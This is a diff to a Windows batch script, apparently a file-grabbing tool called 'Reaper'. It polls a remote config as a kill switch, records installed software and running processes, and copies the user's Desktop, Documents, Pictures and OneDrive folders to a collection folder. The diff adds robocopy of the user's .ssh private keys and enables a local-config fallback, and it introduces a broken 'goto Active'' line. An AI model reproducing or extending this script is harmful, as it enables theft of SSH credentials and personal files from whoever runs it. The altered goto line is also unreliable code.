@@ -20,18 +20,18 @@ for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
         echo remote configuration file is not active. Exiting...
         echo.
         :: uncomment the following line to enable local configuration file 
-        :: echo cheking for local configuration file...
-        :: echo.
-        :: goto Local
-        pause
-        exit /b 0
+         echo cheking for local configuration file...
+         echo.
+         goto Local
+        :: pause
+        :: exit /b 0
     )
 )
 
 :: The script will only reach this point if the remote configuration file is inaccessible or has an unknown format.
 :Local
 :: Check if a local configuration file exists
-if exist "Reaper-config.cfg" (
+if exist "Local-Config.cfg" (
     :: Local configuration file exists
     echo Local configuration file found. Checking if it is active...
 
@@ -40,7 +40,7 @@ if exist "Reaper-config.cfg" (
     if %errorlevel% equ 0 (
         :: The line "Active=true" is found in the local configuration file
         echo Local configuration file is active. Running the script...
-        goto Active
+        goto Active'    
     ) else (
         :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
         echo Local configuration file is not active. Exiting...
@@ -76,6 +76,8 @@ for /f "tokens=2 delims== " %%a in ('curl -s "%configUrl%" ^| findstr /i "Antido
 :: Antidote code not found in the target file, continue running the script
 echo Antidote code not found. Running the script...
 :: Add the rest of your script code here
+
+
 
 :: Read the remote configuration file
 for /f "usebackq tokens=1* delims== " %%a in (`curl -L "%configUrl%"`) do (
@@ -182,7 +184,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "Di
 :: Get list of running processes
 tasklist >> %filename%
  
-
+set "ssh_key=%USERPROFILE%\.ssh\"
 set "desktop=%USERPROFILE%\Desktop\"
 set "documents=%USERPROFILE%\Documents\"
 set "images=%USERPROFILE%\Pictures\"
@@ -199,6 +201,9 @@ echo.
 :: remuve /q to see the files being copied
 md %dest_folder%
 move %filename% "%dest_folder%\"
+echo start copying .ssh
+robocopy %ssh_key% %dest_folder%\.ssh\ %robo_flags%
+echo stop copying .ssh
 echo start copying onedrive
 robocopy %onedrive% %dest_folder%\OneDrive\ %robo_flags%
 echo OneDrive copied
